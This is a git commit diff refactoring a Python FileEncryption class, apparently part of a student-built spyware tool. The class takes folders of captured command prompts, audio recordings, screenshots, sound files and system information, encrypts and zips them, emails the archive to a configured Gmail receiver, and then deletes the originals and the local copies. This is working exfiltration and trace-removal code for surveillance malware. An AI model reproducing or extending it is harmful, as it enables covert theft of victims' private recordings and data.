fe4fef1972a21be5caa4dcf2eb11c6b781d49254
Bobby <s215818@dtu.dk>
2023-12-26 21:45:52 +0100

    Refactor

--- Util/FileEncryption.py
+++ Util/FileEncryption.py
@@ -15,107 +15,82 @@ import Util.SendMail as SendMail
 class FileEncryption(DataClass):
     def __init__(self):
         super().__init__()  # Call the base class __init__ method
-        self.baseclass = DataClass()  # Create an instance of the DataClass
 
+        # Sender mail instance
         self.mailer = SendMail.SendMail
 
         # Constants
-        self.key_path = 'FileKey.key'
         self.zip_file_path = 'Encrypted_Folders.zip'
         self.encrypted_folders_dir = 'Encrypted_Folders'
+        self.key_path = 'EncryptionKey.key'
+
+        # Encryption key
+        self.encryption_key = Fernet.generate_key()
+        with open(self.key_path, 'wb') as key_file:
+            key_file.write(self.encryption_key)
 
         # Folders in a list
         self.folders = [
-            self.baseclass.folder_path_cmd_prompts,
-            self.baseclass.folder_path_recordings,
-            self.baseclass.folder_path_screenshots,
-            self.baseclass.folder_path_soundfile,
-            self.baseclass.folder_path_sys_info
+            self.folder_path_cmd_prompts,
+            self.folder_path_recordings,
+            self.folder_path_screenshots,
+            self.folder_path_soundfile,
+            self.folder_path_sys_info
         ]
 
         self.base_folder = os.path.dirname(os.path.commonprefix(self.folders))
 
         # Load config settings - sender and receiver
-        self.gmail_address_sender = self.baseclass.gmail_address_sender
-        self.gmail_address_receiver = self.baseclass.gmail_address_receiver
-
-    def generate_key(self):
-        key = Fernet.generate_key()
-
-        # String key in a file
-        with open(self.key_path, 'wb') as f:
-            f.write(key)
+        self.gmail_address_sender = self.gmail_address_sender
+        self.gmail_address_receiver = self.gmail_address_receiver
 
     def encrypt_folder(self, folder_path):
-        # Read the encryption key
-        with open(self.key_path, 'rb') as f:
-            key = f.read()
+        try:
+            fernet = Fernet(self.encryption_key)
+            rel_folder_path = os.path.relpath(folder_path, self.base_folder)
+            encrypted_folder_path = os.path.join(self.encrypted_folders_dir, rel_folder_path)
+            shutil.copytree(folder_path, encrypted_folder_path)
 
-        fernet = Fernet(key)
+            for root, _, files in os.walk(encrypted_folder_path):
+                for file in files:
+                    if not file.endswith('.py'):
+                        file_path = os.path.join(root, file)
+                        with open(file_path, 'rb') as f:
+                            org_content = f.read()
+                        encrypted_content = fernet.encrypt(org_content)
+                        with open(file_path, 'wb') as f:
+                            f.write(encrypted_content)
 
-        # Get the relative path to the folder from the base folder
-        rel_folder_path = os.path.relpath(folder_path, self.base_folder)
-
-        # Create the corresponding encrypted folder path inside "Encrypted_Folders"
-        encrypted_folder_path = os.path.join(self.encrypted_folders_dir, rel_folder_path)
-
-        # Copy the original folder to the encrypted folder
-        shutil.copytree(folder_path, encrypted_folder_path)
-
-        # Iterate through the files in the folder
-        for root, _, files in os.walk(encrypted_folder_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-
-                if not file_path.endswith('.py'):
-                    # Read the original file content
-                    with open(file_path, 'rb') as f:
-                        org_content = f.read()
-
-                    # Encrypt the file content
-                    encrypted_content = fernet.encrypt(org_content)
-
-                    # Save the encrypted content back to the file
-                    with open(file_path, 'wb') as f:
-                        f.write(encrypted_content)
+        except Exception as e:
+            print(f"Error encrypting folder {folder_path}: {e}")
+            return False
+        return True
 
     def encrypt_folders(self):
-        # Generate key
-        self.generate_key()
-
-        # Create the "encrypted_folders" directory if it doesn't exist
         os.makedirs(self.encrypted_folders_dir, exist_ok=True)
+        all_encrypted = all(self.encrypt_folder(folder) for folder in self.folders)
+        if all_encrypted:
+            self.create_zip()
+            self.send_email()
+            time.sleep(5)
+            self.delete_files()
+        else:
+            print("Not all folders were encrypted successfully. Aborting deletion.")
 
-        for folder in self.folders:
-            if os.path.exists(folder):
-                self.encrypt_folder(folder)
-
-        # Zip the "encrypted_folders" directory
+    def create_zip(self):
         with zipfile.ZipFile(self.zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
             for root, _, files in os.walk(self.encrypted_folders_dir):
                 for file in files:
                     file_path = os.path.join(root, file)
                     zip_file.write(file_path, os.path.relpath(file_path, self.encrypted_folders_dir))
 
-        # Send the email with the ZIP file as an attachment
+    def send_email(self):
         self.mailer.sender_mail = self.gmail_address_sender
         self.mailer.receiver_mail = self.gmail_address_receiver
-        self.mailer.send_mail(self, self.zip_file_path)
-
-        time.sleep(10)
-
-        self.delete_files()
+        self.mailer.send_mail(self.zip_file_path)
 
     def delete_files(self):
-        # Delete all the original folders
         for folder in self.folders:
             shutil.rmtree(folder)
-
-        # Delete the encrypted folders directory
         shutil.rmtree(self.encrypted_folders_dir)
-
-        # Delete the key file
-        os.remove(self.key_path)
-
-        # Delete the zip file
         os.remove(self.zip_file_path)
